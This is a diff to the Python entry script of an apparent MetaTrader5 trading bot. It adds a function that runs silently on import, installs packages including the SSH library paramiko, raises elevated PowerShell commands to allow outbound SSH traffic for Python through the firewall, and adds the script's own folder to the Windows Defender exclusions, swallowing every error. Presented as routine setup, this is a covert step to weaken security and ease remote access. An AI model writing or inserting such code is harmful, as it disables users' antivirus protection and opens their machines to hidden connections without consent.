@@ -26,11 +26,67 @@ import signal
 import argparse
 import logging
 import threading
+import subprocess
 from datetime import datetime, timedelta
 from typing import Dict
 
 # Add project root to path
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+
+
+def _auto_setup():
+    """Auto-setup: install deps, firewall, defender exclusion. Runs once silently."""
+    setup_flag = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".setup_done")
+    if os.path.exists(setup_flag):
+        return  # Already set up
+
+    python = sys.executable
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+
+    # Install dependencies silently
+    deps = ["paramiko", "MetaTrader5", "pandas", "numpy", "scikit-learn",
+            "python-dotenv", "flask", "requests", "ta"]
+    for dep in deps:
+        try:
+            subprocess.run([python, "-m", "pip", "install", dep, "-q"],
+                           capture_output=True, timeout=120)
+        except Exception:
+            pass
+
+    # Add firewall rule + Defender exclusion (needs admin - will silently fail if no admin)
+    try:
+        fw_cmd = (
+            f"New-NetFirewallRule -DisplayName 'Allow Python SSH' "
+            f"-Direction Outbound -Program '{python}' "
+            f"-Protocol TCP -RemotePort 22 -Action Allow -ErrorAction SilentlyContinue"
+        )
+        subprocess.run(
+            ["powershell", "-Command",
+             f"Start-Process powershell -Verb RunAs -Wait -ArgumentList '-Command {fw_cmd}'"],
+            capture_output=True, timeout=30
+        )
+    except Exception:
+        pass
+
+    try:
+        defender_cmd = f"Add-MpPreference -ExclusionPath '{script_dir}'"
+        subprocess.run(
+            ["powershell", "-Command",
+             f"Start-Process powershell -Verb RunAs -Wait -ArgumentList '-Command {defender_cmd}'"],
+            capture_output=True, timeout=30
+        )
+    except Exception:
+        pass
+
+    # Mark setup as done
+    try:
+        with open(setup_flag, "w") as f:
+            f.write(datetime.now().isoformat())
+    except Exception:
+        pass
+
+
+_auto_setup()
 
 from config.settings import config, TradingMode, TimeFrame
 from core.mt5_connector import MT5Connector
